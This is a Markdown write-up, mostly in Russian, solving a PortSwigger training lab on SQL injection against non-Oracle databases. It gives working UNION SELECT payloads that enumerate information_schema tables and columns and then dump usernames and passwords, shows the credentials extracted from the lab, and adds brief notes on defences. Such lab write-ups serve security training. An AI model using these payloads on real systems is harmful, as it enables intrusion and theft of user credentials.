# 📘 PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Идея атаки](#idea)
- [🔍 Шаг 1 — Поиск таблиц](#step1)
- [🔍 Шаг 2 — Поиск колонок](#step2)
- [🔍 Шаг 3 — Получение данных](#step3)
- [🔍 Шаг 4 — Login as administrator](#step4)
- [🧩 Использованные запросы](#payloads)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Найти таблицу пользователей, определить названия колонок с логинами и паролями, получить credentials и войти как administrator.

---

<a id="idea"></a>

# 🧠 Идея атаки

Используем служебные таблицы `information_schema` для изучения структуры базы данных.

Цепочка атаки:

```text
SQLi
↓
information_schema.tables
↓
information_schema.columns
↓
users table
↓
credentials
↓
administrator login
```

---

<a id="step1"></a>

# 🔍 Шаг 1 — Поиск таблиц

Payload:

```sql
' UNION SELECT NULL,table_name FROM information_schema.tables--
```

---

# Результат

Среди системных таблиц была обнаружена:

```text
users_ulzlmi
```

---

<a id="step2"></a>

# 🔍 Шаг 2 — Поиск колонок

Payload:

```sql
' UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users_ulzlmi'--
```

---

# Результат

Получены колонки:

```text
email
username_mzwppu
password_iwdthc
```

---

<a id="step3"></a>

# 🔍 Шаг 3 — Получение данных

Payload:

```sql
' UNION SELECT username_mzwppu,password_iwdthc
FROM users_ulzlmi--
```

---

# Результат

Получены credentials:

<details>
<summary>Показать credentials пользователей</summary>

```text
carlos         p1hsv8fnrvkrhtachdm9
wiener         aqk737chd0d3t02nuif4
administrator  crk2odwjuiiv1131ra8l
```

</details>

---

<a id="step4"></a>

# 🔍 Шаг 4 — Login as administrator

Используем:

<details>
<summary>Показать credentials администратора</summary>

```text
Username: administrator
Password: crk2odwjuiiv1131ra8l
```

</details>


---

# Результат

Успешный вход в аккаунт administrator.

Лаба решена.

---

<a id="payloads"></a>

# 🧩 Использованные запросы

Поиск таблиц:

```sql
UNION SELECT NULL,table_name FROM information_schema.tables--
```

Поиск колонок:

```sql
UNION SELECT NULL,column_name
FROM information_schema.columns
WHERE table_name='users_ulzlmi'--
```

Получение данных:

```sql
UNION SELECT username_mzwppu,password_iwdthc
FROM users_ulzlmi--
```

---

<a id="why"></a>

# 💥 Почему атака сработала

Приложение:
- вставляло пользовательский ввод напрямую в SQL;
- позволяло выполнять UNION SELECT;
- отображало результаты запросов в response.

---

<a id="defense"></a>

# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Least Privilege
- Ограничение доступа к metadata
- Не отображать SQL errors

---

<a id="checklist"></a>

# 🛠 Чеклист

- [ ] найден SQL Injection
- [ ] найдена users table
- [ ] найдены usernames/password columns
- [ ] получены credentials
- [ ] выполнен login как administrator

---

# ⬆ Наверх

[Вернуться к началу](#top)
